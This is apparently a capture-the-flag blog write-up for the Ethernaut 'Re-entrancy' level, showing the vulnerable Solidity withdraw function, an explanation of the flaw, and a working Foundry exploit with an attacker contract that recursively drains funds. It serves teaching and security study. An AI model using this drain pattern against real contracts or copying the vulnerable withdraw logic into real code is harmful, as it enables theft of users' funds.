---
title: 'Re-entrancy - The Ethernaut'
cover: https://ethernaut.openzeppelin.com/imgs/Level10.svg
categories: ["ctf"]
tags: ["blockchain","ethernaut"]
date: 2025-09-18
lastmod: 2025-09-18
---

## Challenge Overview

This level involves a contract vulnerable to a classic reentrancy attack. The goal is to drain all funds from the contract by exploiting the unsafe order of operations in the `withdraw()` function, which sends Ether before updating the user's balance.

---

## Challenge Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```

---

## Exploit Explanation

The critical vulnerability is in the `withdraw()` function:

```solidity
function withdraw(uint256 _amount) public {
    if (balances[msg.sender] >= _amount) {
        (bool result,) = msg.sender.call{value: _amount}("");  // Ether sent first
        if (result) {
            _amount;
        }
        balances[msg.sender] -= _amount;  // Balance updated later
    }
}
```

The unsafe order of operations allows for a reentrancy attack:
1. The contract sends Ether to the caller **before** updating their balance
2. A malicious contract can implement a `receive()` function that calls `withdraw()` again
3. Since the balance hasn't been updated yet, the second withdrawal also succeeds
4. This recursive pattern continues until all contract funds are drained

The attack sequence:
1. Donate 0.001 ether to create a balance in the malicious contract
2. Call `withdraw(0.001 ether)` to trigger the attack
3. The malicious contract's `receive()` function recursively calls `withdraw()` again
4. Repeat until the target contract is drained

---

## Exploit Script

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.12;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Reentrance.sol";

contract Evil {
    Reentrance public reentranceInstance = Reentrance(payable(<YOUR_INSTANCE>));

    constructor() public payable {
        reentranceInstance.donate{value: 0.001 ether}(address(this));
    }

    function attack() public payable {
        reentranceInstance.withdraw(0.001 ether);
        address(msg.sender).call{value: 0.002 ether}("");
    }

    receive() external payable {
        reentranceInstance.withdraw(0.001 ether);
    }
}

contract ReentranceSolution is Script {
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Evil evil = new Evil{value: 0.001 ether}();
        evil.attack{value: 0.001 ether}();
        vm.stopBroadcast();
    }
}
```

---

## Proof of Concept (PoC)

Execute the exploit with Foundry:

```bash
forge script script/ReentranceSolution.s.sol --rpc-url $SEPOLIA_URL --tc ReentranceSolution --broadcast
```

## Solving SafeMath Import Issue

Similar to previous challenges using Solidity <0.8.0, we need to resolve the SafeMath import issue:

### 1. Configure `foundry.toml`

```toml
solc_version = "0.6.12"
remappings = [
    "forge-std/=lib/forge-std/src/",
    "@openzeppelin/contracts/=lib/openzeppelin-contracts/contracts/"
]
```

### 2. Install the Correct OpenZeppelin Release

```bash
forge install openzeppelin/openzeppelin-contracts@v3.4.2
```

### 3. Update the Import Path

Modify the import statement in the challenge contract:

```diff
- import "openzeppelin-contracts-06/math/SafeMath.sol";
+ import "@openzeppelin/contracts/math/SafeMath.sol";
```

This ensures the compiler correctly resolves the SafeMath dependency for `pragma solidity ^0.6.12`.